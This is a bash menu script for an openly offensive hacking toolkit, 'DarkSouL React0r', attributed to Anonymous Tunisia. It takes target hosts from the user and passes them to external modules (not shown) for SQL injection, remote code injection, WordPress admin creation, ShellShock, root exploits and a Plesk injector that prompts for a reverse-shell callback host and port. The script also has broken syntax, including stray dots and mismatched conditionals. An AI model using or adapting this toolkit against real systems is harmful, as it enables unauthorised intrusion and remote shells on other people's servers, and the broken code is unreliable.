#! /bin/bash
##########################################
#########BITCH NO CHANGING RIGHTS#########
##########Coder:    wh0am!      ##########
###########  ANONYMOUS TUNISIA ###########
##########################################
function jumpto
{
    label=$1
    cmd=$(sed -n "/$label:/{:a;n;p;ba};" $0 | grep -v ':$')
    eval "$cmd"
    exit
}
start=${1:-"start"}

echo "   68 97 114 107 83 111 117 76 82 101 97 99 48 116 114 "
echo    "######################################################"
echo -e "#\e[1;31m             DarkSouL React0r v1.0                  \e[0m#"
echo -e "#\e[1;31m              by: Anonymous \e[5mTN                      \e[0m#"
echo -e "#\e[1;31m              contact:                              \e[0m#"
echo -e "#\e[1;31m              SpyneT.Officiell@gmail.com            \e[0m#"
echo -e "#\e[1;31m              GreeTz To : MadleeTs Family           \e[0m#"

echo    "#                                                    #"
echo    "######################################################"
#Menu
echo -e "\e[32m====================================="
echo "|Chose Type Of Hacking :            |"
echo "|[1] Priv8 GET Location             |"
echo "|[2] LFI Scann3r                    |"
echo "|[3] Joomla Component com_jumi SQL  |"
echo "|[4] 0Day Wordpress Admin Add       |"
echo "|[5] Remote Code Inject0r           |"
echo "|[6] Apache Vuln Scann3r            |"
echo "|[7] PHP HashTable Exploit3r        |"
echo "|[8] Plesk PHP Inject0r             |"
echo "|[9] YaBB 2.5 Cookies Brute         |"
echo "|[10] Priv8 r00Ts - ExpLoiTs        |"
echo "|[11] ShellShock Exploit3r          |"
echo "|[12]  Real3D FlipBook WP Upload    |"
echo "|[13] AnonymousTN -TooLz v1.0       |"
echo "|[14] AnonTN - Mysteries            |"
echo "|[99] exit ..                       |"
echo "====================================="
echo "DRS~\$:"
read type
if [ $type -eq 1 ]; then

echo " Input Target IP : "
read target

perl Module1.pl $target

else
     
##########################################
if [ $type -eq 2 ]; then

perl Module2.pl
##########################################
else

if [ $type -eq 3 ]; then

perl Module3.pl

else

##########################################
if [ $type -eq 4 ]; then

perl Module4.pl

else
##########################################

if [ $type -eq 5 ]; then

echo " Input Target : "
read targ

python Module5.py -h $targ
  
     .

else

##########################################
if [ $type -eq 6 ]; then
python Module6.py -h
##########################################
else
if [ $type -eq 7 ]; then
echo " Input Host : "
read host
echo " Verbose Output : "
read verb
echo "Requests Number : "
read rq
echo " Target To Attack (PHP/JAVA/ASP) : "
read tat
python Module7.py -u $host -v $verb -c $rq -t $tat
  .
##########################################
else
if [ $type -eq 8 ]; then
echo " Input Target PLSK : "
read plsk
echo " Choose Mode (RSH (reverse shell), UP (upload) or SH (inline shell))  "
read modd
echo " Choose File to Upload ( full path ) : "
read uploadfile
echo "Where to put the file on the server (full path) : "
read putfiles
echo "Host to connect back to : "
read backconnect
echo "Port to connect back to : "
read portconnect
echo "Reverse Shell Type - Python or Perl : "
read rvshellz
python Module8.py --target $plsk --mode $modd --lfile $uploadfile --rfile $putfiles --lhost $backconnect --lport $portconnect --stype $rvshellz
   .
##########################################
else

if [ $type -eq 9 ]; then

perl Module9.pl
##########################################
else

if [ $type -eq 10 ]; then

perl Module10.pl
##########################################
else
if [ $type -eq 11 ]; then
echo " Input URL : "
read sh3
perl Module11.pl $sh3
.
##########################################
else
if [ $type -eq 12 ]; then
python Module12.py
##########################################
else
if [ $type -eq 13 ]; then
echo "============================"
echo "|1- Pr0 SMTP SenD3r v1.0   |"
echo "|2- Poodlebleed Mass Sc3nr |"
echo "|3- PHP Payloadgenerator   |"
echo "|00- Turn Back             |"
echo "============================"
echo "DRS~$:"
read menu

if [ $menu -eq 1 ]; then

python Module13.py

##########################################
if [ $menu -eq 2 ]; then

python Module14.py

##########################################
else
if [ $menu -eq 3 ]; then

python Module15.py

##########################################
else
if [ $menu -eq 00 ]; then

jumpto $start

##########################################

else
if [$type -eq 14 ]; then
echo " Coming Soon..."

##########################################
    elif [ $type -eq 00 ]; then
	echo "--------------------------"
    echo "-Now you are Leaving      -"
	echo "--------------------------"
     exit
     .
else 
    echo "You made an error ..."
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
